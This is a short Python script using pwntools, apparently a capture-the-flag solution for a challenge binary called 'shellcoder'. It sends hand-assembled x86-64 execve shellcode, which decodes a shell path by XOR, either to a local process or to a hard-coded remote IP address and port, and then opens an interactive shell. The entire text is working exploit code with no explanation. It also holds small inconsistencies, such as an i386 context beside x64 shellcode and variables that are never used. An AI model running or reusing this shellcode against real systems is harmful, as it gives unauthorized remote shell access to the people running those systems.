from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'

#execve(2) on x64
shellcode = '\x48\x31\xd2\x52'\
			'\x48\xb8\x2f\x63\x79\x6f\x2f\x2f\x72\x78'\
			'\x48\xbb\x00\x01\x10\x01\x00\x00\x01\x10'\
			'\x48\x31\xd8'\
			 '\x50\x54\x5f\x52\x57\x54\x5e\x48'\
			 '\x8d\x42\x3b\x0f\x05'
				
HOST = "153.120.129.186"
PORT = 20000 
conn = None

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process('./shellcoder')

hidden = 0x4007bd
bufsize = 0x10+8

conn.recvline()
conn.sendline(shellcode)

conn.interactive()

